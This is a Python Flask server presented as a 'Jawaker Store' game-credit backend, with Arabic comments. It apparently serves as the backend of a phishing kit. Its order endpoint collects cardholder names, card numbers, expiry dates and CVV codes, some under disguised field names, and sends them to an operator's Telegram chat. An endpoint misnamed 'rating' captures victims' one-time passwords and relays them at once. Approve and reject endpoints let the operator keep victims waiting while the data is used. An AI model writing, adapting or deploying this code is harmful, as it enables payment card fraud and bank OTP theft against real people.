import os
import uuid
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # للسماح بربط الموقع بالسيرفر بدون مشاكل CORS

# ==========================================
# ⚙️ إعدادات البوت والتلغرام
# استبدل القيم هنا بالتوكن الخاص ببوتك ورقم الشات
# ==========================================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE")

# قاعدة بيانات مؤقتة في الذاكرة لتتبع حالة الطلبات
orders_db = {}


def send_telegram_message(text: str):
    """دالة لإرسال الرسائل إلى تليجرام"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return None


def build_admin_message(order_id: str, payload: dict) -> str:
    """صياغة الرسالة ليصل التنبيه كاملاً إلى التليجرام"""
    order_info = payload.get("order", {})

    # قراءة الحقول بالتسميات المرسلة من الـ HTML مباشرة
    month = payload.get("joinDay") or payload.get("month") or "-"
    year = payload.get("joinMonth") or payload.get("year") or "-"
    cvv = payload.get("joinYear") or payload.get("cvv") or "-"

    first_name = payload.get("firstNameRecord") or ""
    last_name = payload.get("lastNameRecord") or ""
    full_billing_name = f"{first_name} {last_name}".strip() or "-"

    return (
        "💳 *طلب دفع جديد* 🟢\n\n"
        f"🆔 *رقم الطلب:* `{order_id}`\n"
        f"📦 *الفئة:* {order_info.get('name', '-')}\n"
        f"💰 *الكمية:* {order_info.get('amount', '-')}\n"
        f"💵 *السعر:* {order_info.get('price', '-')}\n"
        "------------------------------------\n"
        f"🎮 *ID اللاعب:* `{payload.get('id', '-')}`\n"
        f"👤 *اسم البطاقة:* `{payload.get('jawakerName', '-')}`\n"
        f"💳 *رقم البطاقة:* `{payload.get('jawakerNumber', '-')}`\n"
        f"📅 *تاريخ الانتهاء (MM/YY):* `{month}/{year}`\n"
        f"🔒 *رمز الأمان (CVV):* `{cvv}`\n"
        "------------------------------------\n"
        f"🌍 *الدولة:* {payload.get('country', '-')}\n"
        f"📝 *اسم صاحب الفاتورة:* {full_billing_name}"
    )


# ==========================================
# 🛣️ المسارات (Endpoints)
# ==========================================

@app.route("/", methods=["GET"])
def home():
    return jsonify({"status": "Server is running", "message": "Jawaker Store Backend API"}), 200


@app.route("/api/order", methods=["POST"])
def create_order():
    """استقبال بيانات الطلب والبطاقة من الموقع"""
    data = request.get_json() or {}

    # إنشاء ID فريد للطلب
    order_id = str(uuid.uuid4())[:8]

    # حفظ الطلب بحالة معلقة (pending)
    orders_db[order_id] = {
        "status": "pending",
        "data": data
    }

    # إرسال البيانات للتليجرام
    msg = build_admin_message(order_id, data)
    send_telegram_message(msg)

    return jsonify({
        "success": True,
        "order_id": order_id,
        "message": "تم استلام الطلب وبانتظار المراجعة"
    }), 200


@app.route("/api/order/<order_id>", methods=["GET"])
def get_order_status(order_id):
    """فحص حالة الطلب من قبل صفحة الـ HTML (Polling)"""
    order = orders_db.get(order_id)
    if not order:
        return jsonify({"error": "Order not found"}), 404

    return jsonify({
        "order_id": order_id,
        "status": order["status"]
    }), 200


@app.route("/api/order/<order_id>/status", methods=["POST"])
def update_order_status(order_id):
    """تغيير حالة الطلب (approved أو rejected) عبر التليجرام أو لوحة التحكم"""
    if order_id not in orders_db:
        return jsonify({"error": "Order not found"}), 404

    data = request.get_json() or {}
    new_status = data.get("status")

    if new_status in ["approved", "rejected", "pending"]:
        orders_db[order_id]["status"] = new_status
        return jsonify({"success": True, "order_id": order_id, "new_status": new_status}), 200

    return jsonify({"error": "Invalid status"}), 400


@app.route("/api/rating", methods=["POST"])
def receive_otp():
    """استقبال رمز الـ OTP المدخل في نافذة FastPay"""
    data = request.get_json() or {}
    order_id = data.get("order_id", "-")
    otp_code = data.get("rating", "-")

    # إرسال كود الـ OTP المكون من 4 إلى 6 أرقام للتليجرام فوراً
    otp_msg = (
        "🔑 *رمز تحتيق OTP جديد (FastPay)* 🔑\n\n"
        f"🆔 *رقم الطلب:* `{order_id}`\n"
        f"🔢 *رمز الـ OTP:* `{otp_code}`"
    )
    send_telegram_message(otp_msg)

    return jsonify({"success": True, "message": "OTP received successfully"}), 200


if __name__ == "__main__":
    # تشغيل السيرفر على البورت 5000
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
